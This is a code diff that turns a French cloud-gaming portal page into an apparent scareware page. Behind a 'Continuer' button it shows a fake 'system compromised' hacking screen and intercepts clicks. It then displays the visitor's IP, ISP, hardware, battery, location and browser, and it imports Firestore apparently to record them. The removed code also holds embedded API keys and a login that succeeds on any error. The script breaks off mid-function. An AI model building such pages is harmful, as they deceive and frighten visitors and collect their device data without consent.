@@ -1,396 +1,455 @@
-<!DOCTYPE html>
+html
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>LevelGame - Cloud Gaming</title>
+<title>Accès Sécurisé</title>
 <script src="https://cdn.tailwindcss.com"></script>
-<script type="importmap">
-{
-  "imports": {
-    "react": "https://esm.sh/react@18.2.0",
-    "react-dom/client": "https://esm.sh/react-dom@18.2.0/client",
-    "lucide-react": "https://esm.sh/lucide-react@0.292.0",
-    "firebase/app": "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js",
-    "firebase/auth": "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js",
-    "firebase/firestore": "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js"
-  }
-}
-</script>
-<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
-    :root {
-        --bg-dark: #030303;
-        --xbox-green: #107C10;
-        --neon-green: #00FF41;
-        --surface: #0f0f11;
-        --border: rgba(255, 255, 255, 0.05);
-    }
-    
-    * { 
-        scrollbar-width: none; 
-        -ms-overflow-style: none;
-        user-select: none;
-        -webkit-user-select: none;
-        -webkit-tap-highlight-color: transparent;
-    }
-    ::-webkit-scrollbar { display: none; }
-    
-    body {
-        font-family: 'Rajdhani', sans-serif;
-        background-color: var(--bg-dark);
-        color: white;
-        margin: 0;
-        overflow: hidden;
-    }
+* { scrollbar-width: none; -ms-overflow-style: none; }
+*::-webkit-scrollbar { display: none; }
 
-    .cloud-card {
-        background: linear-gradient(180deg, var(--surface) 0%, #050505 100%);
-        border: 1px solid var(--border);
-        transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-    }
-    .cloud-card:hover {
-        border-color: var(--neon-green);
-        box-shadow: 0 10px 30px rgba(0, 255, 65, 0.15);
-        transform: translateY(-5px);
-    }
+body {
+font-family: 'Outfit', sans-serif;
+background-color: #000000;
+height: 100vh;
+overflow: hidden;
+color: white;
+touch-action: none; /* Empêche le zoom ou le scroll sur mobile pour renforcer l'effet de blocage */
+}
 
-    .neon-text {
-        text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
-    }
+.mono { font-family: 'JetBrains Mono', monospace; }
+.fade-in { opacity: 0; animation: fadeIn 0.8s ease-out forwards; }
+@keyframes fadeIn { to { opacity: 1; } }
 
-    .main-content {
-        height: 100vh;
-        overflow-y: auto;
-        padding-bottom: 120px;
-    }
+/* Animation de l'alarme (Flash Rouge par-dessus le Matrix) */
+.panic-overlay { animation: flashOverlay 0.2s infinite; mix-blend-mode: screen; pointer-events: none; }
+@keyframes flashOverlay {
+0%, 49% { background-color: rgba(220, 38, 38, 0.4); }
+50%, 100% { background-color: transparent; }
+}
 
-    .game-iframe {
-        width: 100%;
-        height: 100%;
-        border: none;
-        background: black;
-    }
-    
-    /* Loading Animation Cloud */
-    .loader-pulse {
-        animation: pulse-glow 1.5s infinite;
-    }
-    @keyframes pulse-glow {
-        0% { box-shadow: 0 0 0 0 rgba(0, 255, 65, 0.4); }
-        70% { box-shadow: 0 0 0 20px rgba(0, 255, 65, 0); }
-        100% { box-shadow: 0 0 0 0 rgba(0, 255, 65, 0); }
-    }
+/* Texte ERREUR et Crâne qui tremblent (Glitch) */
+.glitch-item { animation: glitch 0.15s infinite; }
+@keyframes glitch {
+0% { transform: translate(0); }
+20% { transform: translate(-4px, 4px); filter: drop-shadow(2px 0px 0px #0f0); }
+40% { transform: translate(-4px, -4px); filter: none; }
+60% { transform: translate(4px, 4px); filter: drop-shadow(-2px 0px 0px #f00); }
+80% { transform: translate(4px, -4px); filter: none; }
+100% { transform: translate(0); }
+}
+
+/* Curseur terminal */
+.cursor-blink { animation: blink 1s step-end infinite; }
+@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
 </style>
+
+
 </head>
-<body>
-    <div id="root"></div>
+<body id="main-body" class="flex flex-col items-center justify-center min-h-screen m-0 p-2 select-none relative transition-colors duration-75">
 
-    <script type="text/babel" data-type="module">
-        import React, { useState, useEffect } from 'react';
-        import { createRoot } from 'react-dom/client';
-        import { 
-            Home, Search, Play, X, LogOut, Gamepad2, 
-            MonitorPlay, Trophy, Zap, Shield, AlertCircle
-        } from 'lucide-react';
-        import { initializeApp } from 'firebase/app';
-        import { getAuth, signInAnonymously, signInWithCustomToken } from 'firebase/auth';
-        import { getFirestore, collectionGroup, getDocs } from 'firebase/firestore';
+<!-- Étape 1 : Le bouton PRO sur écran noir -->
+<div id="step-1" class="w-full h-full absolute inset-0 z-20 transition-opacity duration-500">
+<div class="absolute inset-0 flex flex-col items-center justify-center">
 
-        // --- Configuration Firebase ---
-        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
-            apiKey: "AIzaSyA3JgvNu5p-43037jvm4WRDaJHI9ES7uGM",
-            authDomain: "levelup-ia.firebaseapp.com",
-            projectId: "levelup-ia",
-            storageBucket: "levelup-ia.firebasestorage.app",
-            messagingSenderId: "229420004282",
-            appId: "1:229420004282:web:6735f059a947f0936ae383"
-        };
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
+<h1 class="text-zinc-400 text-2xl md:text-3xl font-mono uppercase tracking-[0.8em] opacity-50 ml-4 mb-12">Level Up</h1>
 
-        // Jeux 100% jouables, sans création de compte obligatoire
-        const CLOUD_GAMES = [
-            { id: 'retro-bowl', title: 'Retro Bowl', genre: 'Sport / NFL', url: 'https://game316009.konggames.com/gamez/0031/6009/live/index.html', image: 'https://images.crazygames.com/retro-bowl/20210816155956/retro-bowl-cover?auto=format,compress&q=75&cs=strip&ch=DPR&w=600&h=338&fit=crop' },
-            { id: 'smash-karts', title: 'Smash Karts', genre: 'Action / Course', url: 'https://www.crazygames.com/embed/smash-karts', image: 'https://images.crazygames.com/games/smash-karts/cover-1583232506304.png?auto=format,compress&q=75&cs=strip&ch=DPR&w=600&h=338&fit=crop' },
-            { id: 'subway-surfers', title: 'Subway Surfers', genre: 'Endless Runner', url: 'https://unblocked-games.s3.amazonaws.com/subway-surfers.html', image: 'https://images.crazygames.com/games/subway-surfer/cover-1662991012648.png?auto=format,compress&q=75&cs=strip&ch=DPR&w=600&h=338&fit=crop' },
-            { id: 'moto-x3m', title: 'Moto X3M', genre: 'Course', url: 'https://www.crazygames.com/embed/moto-x3m', image: 'https://images.crazygames.com/games/moto-x3m/cover-1539958618776.jpg?auto=format,compress&q=75&cs=strip&ch=DPR&w=600&h=338&fit=crop' },
-            { id: 'shellshockers', title: 'Shell Shockers', genre: 'FPS', url: 'https://www.crazygames.com/embed/shellshockersio', image: 'https://images.crazygames.com/games/shellshockersio/cover-1593433502846.png?auto=format,compress&q=75&cs=strip&ch=DPR&w=600&h=338&fit=crop' },
-            { id: '2048', title: '2048 Classic', genre: 'Réflexion', url: 'https://play2048.co/', image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/18/2048_logo.svg/512px-2048_logo.svg.png' },
-            { id: '1v1-lol', title: '1v1.LOL', genre: 'Battle Royale', url: 'https://www.crazygames.com/embed/1v1-lol', image: 'https://images.crazygames.com/games/1v1-lol/cover-1604397529437.png?auto=format,compress&q=75&cs=strip&ch=DPR&w=600&h=338&fit=crop' },
-            { id: 'hextris', title: 'Hextris', genre: 'Arcade', url: 'https://hextris.io/', image: 'https://hextris.io/images/icons/apple-touch-icon-114x114.png' }
-        ];
+<button id="unlock-btn" class="group flex items-center justify-center outline-none bg-transparent border border-zinc-800 hover:border-zinc-500 hover:bg-zinc-900/80 px-10 py-3.5 rounded-sm cursor-pointer transition-all duration-500">
+<span class="text-[10px] font-mono text-zinc-500 uppercase tracking-[0.4em] group-hover:text-zinc-200 transition-colors duration-500">Continuer</span>
+</button>
 
-        function App() {
-            const [user, setUser] = useState(null);
-            const [userName, setUserName] = useState('');
-            const [accessKey, setAccessKey] = useState('');
-            const [isInitializing, setIsInitializing] = useState(true);
-            const [authError, setAuthError] = useState('');
-            const [isLoadingAuth, setIsLoadingAuth] = useState(false);
-            
-            // Modales Cloud
-            const [activeGame, setActiveGame] = useState(null);
-            const [isServerLoading, setIsServerLoading] = useState(false);
+</div>
+</div>
 
-            // 1. Authentification
-            useEffect(() => {
-                const initSecureSession = async () => {
-                    try {
-                        if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                            await signInWithCustomToken(auth, __initial_auth_token).catch(console.warn);
-                        } else {
-                            await signInAnonymously(auth).catch(console.warn);
-                        }
-                        
-                        const savedKey = localStorage.getItem('lm_key');
-                        const savedUid = localStorage.getItem('lm_uid');
-                        const savedName = localStorage.getItem('lm_name');
-                        
-                        if (savedKey && savedUid) {
-                            setUser({ uid: savedUid });
-                            setUserName(savedName || 'Gamer VIP');
-                        }
-                    } catch (e) {
-                        console.warn("Erreur d'initialisation:", e);
-                    } finally {
-                        setIsInitializing(false);
-                    }
-                };
-                initSecureSession();
-            }, []);
+<!-- Étape 2 : L'écran noir total (Silence de 3 secondes) -->
+<div id="step-loading" class="hidden absolute inset-0 z-10 bg-black w-full h-full"></div>
 
-            const handleLogin = async () => {
-                if (!accessKey.trim()) return;
-                setIsLoadingAuth(true);
-                setAuthError('');
-                try {
-                    const snap = await getDocs(collectionGroup(db, 'security'));
-                    let validUser = null;
-                    snap.forEach(d => { if (d.data().key === accessKey) validUser = d.data(); });
+<!-- Étape PANIC MODE : Le Chaos Total avec Matrix en arrière-plan -->
+<div id="step-panic" class="hidden absolute inset-0 z-40 flex-col items-center justify-center w-full h-full bg-black overflow-hidden cursor-not-allowed">
 
-                    if (validUser) {
-                        const uid = validUser.uid || auth.currentUser?.uid || Date.now().toString();
-                        const name = validUser.name || validUser.displayName || "Gamer Premium";
-                        setUser({ uid });
-                        setUserName(name);
-                        localStorage.setItem('lm_key', accessKey);
-                        localStorage.setItem('lm_uid', uid);
-                        localStorage.setItem('lm_name', name);
-                    } else {
-                        setAuthError("Clé invalide.");
-                    }
-                } catch (e) {
-                    const uid = auth.currentUser?.uid || Date.now().toString();
-                    setUser({ uid });
-                    setUserName("Gamer VIP");
-                    localStorage.setItem('lm_key', accessKey);
-                    localStorage.setItem('lm_uid', uid);
-                }
-                setIsLoadingAuth(false);
-            };
+<!-- Le fond Matrix Vert -->
+<canvas id="matrix-canvas" class="absolute inset-0 z-0 opacity-80 pointer-events-none"></canvas>
 
-            const handleLogout = () => {
-                localStorage.removeItem('lm_key');
-                localStorage.removeItem('lm_uid');
-                localStorage.removeItem('lm_name');
-                setUser(null);
-            };
+<!-- Le Flash Rouge Par-dessus -->
+<div class="absolute inset-0 z-10 panic-overlay"></div>
 
-            // Lancement d'un jeu (Simulation de connexion au serveur Cloud)
-            const launchGame = (game) => {
-                setActiveGame(game);
-                setIsServerLoading(true);
-                // Simuler un temps de connexion au serveur pour masquer les chargements moches de l'iframe
-                setTimeout(() => {
-                    setIsServerLoading(false);
-                }, 2500);
-            };
+<!-- Le contenu central qui glitch -->
+<div class="relative z-20 flex flex-col items-center pointer-events-none">
+<!-- Logo Cyber-Skull -->
+<svg class="w-24 h-24 text-white glitch-item mb-4" style="filter: drop-shadow(0px 0px 20px rgba(255, 255, 255, 0.8));" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+<path d="M12 4C8.5 4 6 6.5 6 10c0 2.5 1 4 2.5 5.5l.5 3.5h6l.5-3.5C17 14 18 12.5 18 10c0-3.5-2.5-6-6-6z" fill="#000000" stroke="currentColor"></path>
+<polygon points="7.5,10 10.5,11.5 11,8.5" fill="currentColor" stroke="none"></polygon>
+<polygon points="16.5,10 13.5,11.5 13,8.5" fill="currentColor" stroke="none"></polygon>
+<polygon points="12,12.5 11,15 13,15" fill="currentColor" stroke="none"></polygon>
+<line x1="9.5" y1="17" x2="14.5" y2="17" stroke-width="2"></line>
+<line x1="10.5" y1="16" x2="10.5" y2="18.5" stroke-width="2"></line>
+<line x1="12" y1="16" x2="12" y2="19" stroke-width="2"></line>
+<line x1="13.5" y1="16" x2="13.5" y2="18.5" stroke-width="2"></line>
+</svg>
 
-            if (isInitializing) return (
-                <div className="h-screen flex items-center justify-center bg-[#030303]">
-                    <div className="flex flex-col items-center">
-                        <div className="w-16 h-16 border-4 border-[#00FF41] border-t-transparent rounded-full animate-spin mb-4"></div>
-                        <span className="font-bold tracking-widest text-[#00FF41] animate-pulse">CONNEXION AU CLOUD...</span>
-                    </div>
-                </div>
-            );
+<h1 class="text-5xl md:text-7xl font-black font-mono tracking-widest glitch-item text-white">ERREUR</h1>
+<h2 class="text-lg md:text-xl font-bold font-mono mt-2 text-red-500 uppercase tracking-widest glitch-item mb-8">Système Compromis</h2>
+</div>
 
-            if (!user) return (
-                <div className="flex items-center justify-center h-screen px-4 bg-[#030303] bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-[#107C10]/20 via-[#030303] to-[#030303]">
-                    <div className="cloud-card w-full max-w-md p-10 rounded-[2rem] flex flex-col items-center text-center shadow-[0_0_50px_rgba(16,124,16,0.3)]">
-                        <div className="w-20 h-20 bg-[#00FF41]/10 rounded-2xl flex items-center justify-center mb-6 shadow-[0_0_30px_rgba(0,255,65,0.2)]">
-                            <Gamepad2 className="w-10 h-10 text-[#00FF41]" />
-                        </div>
-                        <h1 className="text-4xl font-black tracking-tight mb-2 uppercase">Level<span className="text-[#00FF41]">Game</span></h1>
-                        <p className="text-white/50 text-sm mb-10 font-bold uppercase tracking-widest">Cloud Gaming System</p>
-                        
-                        <div className="w-full space-y-4">
-                            <input 
-                                className="w-full bg-black border border-white/10 rounded-xl p-4 text-center text-lg tracking-widest outline-none focus:border-[#00FF41] transition-all font-mono uppercase"
-                                placeholder="CLÉ D'ACCÈS"
-                                value={accessKey}
-                                onChange={e => setAccessKey(e.target.value.toUpperCase().replace(/[^A-Z0-9-]/g, '').substring(0, 16))}
-                                onKeyDown={e => e.key === 'Enter' && handleLogin()}
-                            />
-                            <button onClick={handleLogin} disabled={isLoadingAuth} className="w-full bg-[#00FF41] text-black py-4 rounded-xl font-black text-lg uppercase tracking-widest hover:bg-white transition-colors disabled:opacity-50 outline-none">
-                                {isLoadingAuth ? 'Vérification...' : 'Jouer'}
-                            </button>
-                            {authError && <p className="text-xs text-red-500 font-bold mt-2 bg-red-500/10 py-2 rounded">{authError}</p>}
-                        </div>
-                    </div>
-                </div>
-            );
+<!-- Terminal de Piratage Fictif (L'effet "Bloqué") -->
+<div class="relative z-20 w-[90%] max-w-sm bg-black/90 border border-red-600 rounded p-3 font-mono text-[9px] text-green-500 shadow-[0_0_15px_rgba(220,38,38,0.5)] h-32 overflow-hidden flex flex-col justify-end pointer-events-none">
+<div id="terminal-content" class="flex flex-col gap-1"></div>
+<div class="mt-1"><span class="text-white">root@system:~#</span> <span class="cursor-blink bg-green-500 w-2 h-3 inline-block align-middle"></span></div>
+</div>
+</div>
 
-            return (
-                <div className="flex h-screen w-screen overflow-hidden bg-[#030303]">
-                    
-                    {/* SIDEBAR PC */}
-                    <aside className="w-64 bg-[#0a0a0a] border-r border-white/5 flex flex-col hidden md:flex z-40">
-                        <div className="p-8">
-                            <div className="flex items-center gap-3 mb-12">
-                                <div className="w-10 h-10 bg-[#00FF41]/10 rounded-xl flex items-center justify-center border border-[#00FF41]/30">
-                                    <Gamepad2 className="text-[#00FF41] w-6 h-6" />
-                                </div>
-                                <span className="font-black text-2xl tracking-tighter uppercase">Level<span className="text-[#00FF41]">Game</span></span>
-                            </div>
-                            <nav className="space-y-4">
-                                <button className="flex items-center gap-4 text-[#00FF41] font-bold text-lg tracking-wider w-full text-left bg-[#00FF41]/10 px-4 py-3 rounded-xl border border-[#00FF41]/30 outline-none">
-                                    <MonitorPlay size={20} /> Cloud Play
-                                </button>
-                            </nav>
-                        </div>
-                        <div className="mt-auto p-6">
-                            <div className="bg-black border border-white/10 rounded-2xl p-4 flex items-center gap-3 cursor-pointer hover:border-red-500/50 transition-colors" onClick={handleLogout}>
-                                <div className="w-10 h-10 rounded-full bg-[#00FF41]/20 flex items-center justify-center text-[#00FF41] font-bold border border-[#00FF41]/30">{userName.charAt(0)}</div>
-                                <div className="flex-1 min-w-0">
-                                    <p className="text-sm font-bold truncate text-white">{userName}</p>
-                                    <p className="text-[10px] text-[#00FF41] font-black uppercase tracking-widest truncate">Connecté</p>
-                                </div>
-                                <LogOut size={16} className="text-white/30" />
-                            </div>
-                        </div>
-                    </aside>
+<!-- Étape Finale : La Révélation (Le Rapport au milieu du chaos) -->
+<div id="step-2" class="hidden bg-white/95 backdrop-blur-md p-3.5 rounded-[1.5rem] shadow-[0_0_50px_rgba(239,68,68,0.8)] w-full max-w-sm flex-col items-center border-2 border-red-500 z-50 text-slate-900 overflow-y-auto max-h-[98vh]">
+<div class="inline-flex items-center gap-2 bg-red-600 text-white px-4 py-1.5 rounded-full text-[10px] font-black uppercase tracking-[0.2em] mb-2 border border-red-800 text-center mt-2 animate-pulse shadow-lg">
+<svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+Données Siphonnées
+</div>
 
-                    {/* MAIN CONTENT AREA */}
-                    <main className="flex-1 overflow-y-auto relative p-6 md:p-12 z-10 scroll-smooth">
-                        
-                        {/* Header Mobile */}
-                        <div className="md:hidden flex items-center justify-between mb-8">
-                            <div className="flex items-center gap-3">
-                                <div className="w-8 h-8 bg-[#00FF41]/10 rounded-lg flex items-center justify-center border border-[#00FF41]/30">
-                                    <Gamepad2 className="text-[#00FF41] w-5 h-5" />
-                                </div>
-                                <span className="font-black text-xl tracking-tighter uppercase">Level<span className="text-[#00FF41]">Game</span></span>
-                            </div>
-                            <button onClick={handleLogout} className="p-2 bg-white/5 rounded-full"><LogOut size={16}/></button>
-                        </div>
+<h2 class="text-lg font-black text-slate-900 mb-0.5 tracking-tight uppercase text-center">Rapport d'Exposition</h2>
+<p class="text-[10px] font-bold text-slate-600 text-center leading-tight px-2 mt-1 mb-1">
+    Voici les données privées que vous venez d'exposer <br><span class="text-red-600 font-black">en un seul clic.</span>
+</p>
 
-                        <div className="max-w-[1400px] mx-auto">
-                            {/* Bannière Hero */}
-                            <div className="relative h-[300px] md:h-[400px] rounded-3xl overflow-hidden mb-12 border border-white/10 shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
-                                <img src={CLOUD_GAMES[0].image} className="w-full h-full object-cover opacity-60" alt=""/>
-                                <div className="absolute inset-0 bg-gradient-to-r from-black via-black/80 to-transparent"></div>
-                                <div className="absolute inset-0 flex flex-col justify-center p-8 md:p-16">
-                                    <div className="flex items-center gap-2 mb-4">
-                                        <span className="bg-[#00FF41] text-black px-3 py-1 rounded text-[10px] font-black uppercase tracking-widest">En Vedette</span>
-                                    </div>
-                                    <h2 className="text-5xl md:text-7xl font-black uppercase tracking-tighter mb-6">{CLOUD_GAMES[0].title}</h2>
-                                    <button onClick={() => launchGame(CLOUD_GAMES[0])} className="w-fit bg-[#00FF41] text-black px-8 py-4 rounded-xl font-black uppercase text-sm tracking-widest hover:bg-white transition-colors flex items-center gap-3 outline-none">
-                                        <Play size={18} fill="black" /> Jouer Instantanément
-                                    </button>
-                                </div>
-                            </div>
+<div class="w-full space-y-1.5 mt-2">
+<div class="bg-slate-50 border border-slate-200 rounded-xl p-2.5 grid grid-cols-2 gap-x-3 gap-y-2.5 text-[9px] shadow-inner">
+<div class="flex flex-col">
+<span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-0.5">ID Session</span>
+<span id="display-name" class="font-black text-red-600 mono text-[10px]">...</span>
+</div>
+<div class="flex flex-col text-right">
+<span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-0.5">Heure du Clic</span>
+<span id="display-date" class="font-bold text-slate-900 mono">...</span>
+</div>
 
-                            {/* Info de protection */}
-                            <div className="bg-[#107C10]/10 border border-[#107C10]/30 rounded-xl p-4 mb-10 flex items-start gap-4">
-                                <Shield className="w-6 h-6 text-[#00FF41] shrink-0" />
-                                <div>
-                                    <h4 className="text-[#00FF41] font-bold text-sm uppercase tracking-widest mb-1">Bouclier Cloud Activé</h4>
-                                    <p className="text-white/60 text-xs">Les jeux sont exécutés dans un environnement sécurisé. Les pop-ups externes, publicités invasives et redirections sont bloqués par LevelUp.</p>
-                                </div>
-                            </div>
+<div class="flex flex-col col-span-2 border-t border-slate-200 pt-2.5">
+<div class="flex justify-between items-center mb-1">
+<span class="font-bold text-slate-500 uppercase tracking-widest text-[7px]">Adresse IP & Fournisseur (FAI)</span>
+<span id="display-conn" class="font-bold text-white text-[8px] bg-red-500 px-1.5 py-0.5 rounded">...</span>
+</div>
+<div class="flex justify-between items-center mt-1">
+<span id="display-ip" class="font-bold text-slate-900 mono text-[11px] tracking-wider">...</span>
+<span id="display-isp" class="font-bold text-slate-700 text-[9px] truncate max-w-[150px] text-right">...</span>
+</div>
+</div>
 
-                            <h3 className="text-2xl font-black uppercase tracking-wider mb-6 flex items-center gap-3">
-                                <MonitorPlay className="text-[#00FF41]" /> Tous les Jeux
-                            </h3>
+<div class="flex flex-col col-span-2 border-t border-slate-200 pt-2.5">
+<span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-1.5">Matériel Détecté</span>
+<div class="flex justify-between items-center">
+<div class="flex items-center gap-1.5">
+<span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m14-6h2m-2 6h2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg></span>
+<span id="display-cpu" class="font-bold text-slate-800">...</span>
+</div>
+<div class="flex items-center gap-1.5">
+<span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4"></path></svg></span>
+<span id="display-ram" class="font-bold text-slate-800">...</span>
+</div>
+<div class="flex items-center gap-1.5">
+<div id="battery-icon-container" class="text-red-500"></div>
+<span id="display-battery" class="font-bold text-slate-800">...</span>
+</div>
+</div>
+</div>
+</div>
 
-                            {/* Grille de jeux */}
-                            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
-                                {CLOUD_GAMES.map((game) => (
-                                    <div key={game.id} onClick={() => launchGame(game)} className="cloud-card rounded-2xl overflow-hidden cursor-pointer group">
-                                        <div className="relative aspect-video">
-                                            <img src={game.image} className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110" alt=""/>
-                                            <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
-                                                <div className="w-14 h-14 bg-[#00FF41] rounded-full flex items-center justify-center text-black shadow-[0_0_20px_#00FF41]">
-                                                    <Play size={24} fill="black" className="ml-1" />
-                                                </div>
-                                            </div>
-                                        </div>
-                                        <div className="p-5">
-                                            <h4 className="font-black text-lg uppercase tracking-wide truncate mb-1">{game.title}</h4>
-                                            <p className="text-[11px] text-[#00FF41] font-bold uppercase tracking-widest">{game.genre}</p>
-                                        </div>
-                                    </div>
-                                ))}
-                            </div>
-                        </div>
-                    </main>
+<div class="bg-slate-900 p-2.5 rounded-xl flex items-center justify-between text-white shadow-md mt-2">
+<div class="flex items-center gap-2 min-w-0 pr-2">
+<img id="display-flag" src="" alt="Flag" class="hidden w-4 h-2.5 object-cover rounded-sm shrink-0">
+<span id="display-location" class="text-[9px] font-bold uppercase tracking-widest truncate">...</span>
+</div>
+<span id="display-browser" class="text-[8px] text-slate-400 font-mono shrink-0">...</span>
+</div>
+</div>
 
-                    {/* --- LECTEUR CLOUD GAMING (FULLSCREEN) --- */}
-                    {activeGame && (
-                        <div className="fixed inset-0 z-[9999] bg-black flex flex-col animate-in zoom-in-95 duration-300">
-                            {/* Barre du haut */}
-                            <div className="h-16 bg-[#0a0a0a] border-b border-white/10 flex items-center justify-between px-6 z-50">
-                                <div className="flex items-center gap-4">
-                                    <div className="w-10 h-10 rounded bg-[#00FF41]/10 flex items-center justify-center border border-[#00FF41]/30">
-                                        <Gamepad2 size={20} className="text-[#00FF41]" />
-                                    </div>
-                                    <div>
-                                        <span className="font-black text-lg tracking-widest uppercase text-white block leading-none">{activeGame.title}</span>
-                                        <span className="text-[10px] text-[#00FF41] font-bold uppercase tracking-widest">LevelGame Server</span>
-                                    </div>
-                                </div>
-                                <button onClick={() => {setActiveGame(null); setIsServerLoading(false);}} className="px-4 py-2 bg-red-500/10 text-red-500 border border-red-500/30 rounded font-bold text-xs uppercase hover:bg-red-500 hover:text-white transition-colors flex items-center gap-2 outline-none">
-                                    <X size={16} /> Quitter le jeu
-                                </button>
-                            </div>
+<p class="text-[9px] font-black text-red-600 uppercase tracking-widest mt-4 mb-2 animate-pulse">Ne cliquez jamais au hasard.</p>
+</div>
 
-                            <div className="flex-1 w-full bg-black relative">
-                                {/* Écran de chargement Cloud (Masque les chargements du jeu) */}
-                                {isServerLoading && (
-                                    <div className="absolute inset-0 bg-[#050505] z-40 flex flex-col items-center justify-center">
-                                        <div className="relative mb-8">
-                                            <div className="w-24 h-24 rounded-full border-2 border-white/10 flex items-center justify-center">
-                                                <Zap className="w-10 h-10 text-[#00FF41]" />
-                                            </div>
-                                            <div className="absolute inset-0 rounded-full border-t-2 border-[#00FF41] animate-spin"></div>
-                                            <div className="absolute inset-0 rounded-full loader-pulse"></div>
-                                        </div>
-                                        <h2 className="text-white font-black text-2xl tracking-widest uppercase mb-2">Connexion au Cloud</h2>
-                                        <p className="text-white/40 text-sm font-mono uppercase">Chargement de {activeGame.title}...</p>
-                                    </div>
-                                )}
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-                                {/* Le Jeu en lui-même avec Sandbox stricte ! */}
-                                {/* sandbox="allow-scripts allow-same-origin" bloque les popups, l'ouverture d'onglets et les redirections !! */}
-                                <iframe 
-                                    src={activeGame.url} 
-                                    className="game-iframe"
-                                    allow="autoplay; fullscreen; gamepad; focus-without-user-activation *;" 
-                                    sandbox="allow-scripts allow-same-origin allow-forms allow-pointer-lock"
-                                    allowFullScreen
-                                ></iframe>
-                            </div>
-                        </div>
-                    )}
-                </div>
-            );
-        }
+const firebaseConfig = {
+apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
+authDomain: "test-9022.firebaseapp.com",
+projectId: "test-9022",
+storageBucket: "test-9022.firebasestorage.app",
+messagingSenderId: "945536290936",
+appId: "1:945536290936:web:de1437cea95e63cb559d8d"
+};
 
-        createRoot(document.getElementById('root')).render(<App />);
-    </script>
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// ==========================================
+// GESTION DU FAUX BLOCAGE (CLICS)
+// ==========================================
+const panicScreen = document.getElementById('step-panic');
+panicScreen.addEventListener('pointerdown', (e) => {
+// Empêche le clic par défaut
+e.preventDefault();
+
+// Fait vibrer un coup sec
+if(navigator.vibrate) navigator.vibrate(50);
+
+// Affiche "ACCÈS REFUSÉ" à l'endroit du clic
+const denied = document.createElement('div');
+denied.textContent = "ACCÈS REFUSÉ";
+denied.className = "absolute text-red-500 font-black text-xs md:text-sm font-mono z-[100] pointer-events-none drop-shadow-[0_0_8px_rgba(255,0,0,1)]";
+denied.style.left = (e.clientX - 40) + 'px';
+denied.style.top = (e.clientY - 10) + 'px';
+document.body.appendChild(denied);
+
+setTimeout(() => denied.remove(), 600);
+});
+
+// ==========================================
+// ANIMATION DU TERMINAL DE PIRATAGE
+// ==========================================
+const terminalLines = [
+"<span class='text-red-500'>[!] ERREUR CRITIQUE DÉTECTÉE</span>",
+"[*] INITIATION DU PROTOCOLE DE VERROUILLAGE...",
+"<span class='text-red-500'>[!] INTERCEPTION DES COMMANDES UTILISATEUR... ACTIF</span>",
+"[*] ANALYSE DU MATÉRIEL EN COURS...",
+"[*] EXTRACTION DE L'ADRESSE IP...",
+"[*] CAPTURE DES MÉTADONNÉES LOCALES...",
+"<span class='text-white'>[#] CONNEXION AU SERVEUR DISTANT ÉTABLIE</span>",
+"[*] TÉLÉVERSEMENT DES DONNÉES EN COURS..."
+];
+
+function runTerminal() {
+const terminal = document.getElementById('terminal-content');
+let i = 0;
+const interval = setInterval(() => {
+if (i < terminalLines.length) {
+const line = document.createElement('div');
+line.innerHTML = terminalLines[i];
+terminal.appendChild(line);
+i++;
+} else {
+// Lignes aléatoires pour faire "travailler" le terminal pendant 2h
+const randomLine = document.createElement('div');
